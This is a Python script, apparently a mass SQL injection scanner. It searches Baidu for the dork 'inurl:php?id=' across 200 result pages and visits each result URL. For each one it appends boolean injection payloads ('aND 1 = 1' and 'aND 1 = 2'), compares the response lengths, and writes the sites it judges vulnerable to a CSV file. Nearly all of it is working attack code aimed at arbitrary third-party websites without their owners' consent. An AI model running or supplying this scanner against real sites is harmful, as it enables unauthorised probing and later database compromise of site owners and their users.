#!/usr/bin/env python
# -*- coding:utf-8 -*-
import re
import time
import requests
import _thread
from queue import Queue
from bs4 import BeautifulSoup as bs
import codecs
import pandas as pd


class SQLSpider:
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0'}
    fileName = 'result.csv'
    total = 0
    found = 0
    column = ['链接', '值']
    dataList = []

    def __init__(self, urlQueue, num=4):
        self.urlQueue = urlQueue
        self.threadNum = num

    def setHeader(self, header):
        self.header = header

    def run_func(self):
        while not self.urlQueue.empty():
            url = self.urlQueue.get()
            r = requests.get(url, headers=self.header)
            urls = bs(r.text, 'lxml').findAll("a", {"data-click": re.compile((".")), "class": None})
            for i in urls:
                try:
                    get_url = requests.get(i['href'], headers=self.header, timeout=10)
                    if get_url.status_code == 200:
                        print('检测' + get_url.url)
                        scan = get_url.url
                        payloads = {'src': scan, 'bool_true': scan + ' aND  1 = 1',
                                    'bool_false': scan + ' aND 1 = 2'}
                        self.total += 1
                        try:
                            r_scr = requests.get(payloads['src'], timeout=5).headers['Content-Length']
                            r_true = requests.get(payloads['bool_true'], timeout=5).headers['Content-Length']
                            r_false = requests.get(payloads['bool_false'], timeout=5).headers['Content-Length']
                        except Exception:
                            pass

                        if r_scr == r_true:
                            if r_true != r_false:
                                print('\t发现漏洞： ', scan)
                                self.dataList.append([get_url, scan])
                                self.found += 1
                except Exception:
                    print('url error')
                    pass

    def save(self):
        f = codecs.open(self.fileName, 'w', "utf-8-sig")
        pd.DataFrame(columns=self.column, data=self.dataList).to_csv(f)

    def startRun(self):
        for i in range(self.threadNum):
            _thread.start_new_thread(self.run_func, ())
        while True:
            if self.urlQueue.empty():
                print('完成，共检测' + str(self.total) + '个网址，发现' + str(self.found) + '个有SQL注入漏洞')
                self.save()
                break
            time.sleep(1)


if __name__ == '__main__':
    keyWord = 'inurl:php?id='
    pages = 200
    queue = Queue()
    for i in range(0, pages):
        queue.put('https://www.baidu.com/s?wd=' + keyWord + '&pn=' + str(i))
    spider = SQLSpider(queue, num=8)
    spider.startRun()
